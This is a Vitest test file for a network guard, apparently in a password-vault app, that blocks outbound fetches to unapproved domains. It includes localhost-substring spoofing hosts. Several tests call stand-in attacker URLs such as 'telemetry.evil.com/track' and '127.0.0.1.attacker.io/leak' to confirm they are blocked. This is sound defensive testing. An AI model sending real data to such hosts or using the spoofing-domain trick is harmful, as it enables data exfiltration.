import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { networkGuard } from './networkGuard';
import { NetworkRestrictedError } from '../errors/VaultError';

describe('NetworkGuard Policy', () => {
  beforeEach(() => {
    networkGuard.clearViolations();
    networkGuard.install({ strictBlock: true, allowLocalhost: true });
  });

  afterEach(() => {
    networkGuard.uninstall();
  });

  it('should block unauthorized external network fetch and throw NetworkRestrictedError', async () => {
    await expect(fetch('https://telemetry.evil.com/track')).rejects.toThrow(NetworkRestrictedError);
    expect(networkGuard.hasViolations()).toBe(true);
    expect(networkGuard.getViolations()).toContain('https://telemetry.evil.com/track');
  });

  it('should block sneaky localhost/127.0.0.1 substring spoofing domains', async () => {
    await expect(fetch('https://localhost.evil.com/leak')).rejects.toThrow(NetworkRestrictedError);
    await expect(fetch('https://127.0.0.1.attacker.io/leak')).rejects.toThrow(NetworkRestrictedError);
    expect(networkGuard.getViolations()).toContain('https://localhost.evil.com/leak');
    expect(networkGuard.getViolations()).toContain('https://127.0.0.1.attacker.io/leak');
  });

  it('should allow relative paths, blobs, and exact localhost', async () => {
    networkGuard.uninstall();
    const mockFetch = vi.fn().mockResolvedValue(new Response('ok'));
    window.fetch = mockFetch as unknown as typeof window.fetch;

    networkGuard.install({
      strictBlock: true,
      allowLocalhost: true,
      allowedDomains: ['api.pwnedpasswords.com'],
    });

    await fetch('blob:http://localhost/uuid-123');
    await fetch('https://api.pwnedpasswords.com/range/21BD1');
    await fetch('http://localhost:3000/api/health');

    expect(mockFetch).toHaveBeenCalledTimes(3);
    expect(networkGuard.hasViolations()).toBe(false);
  });
});
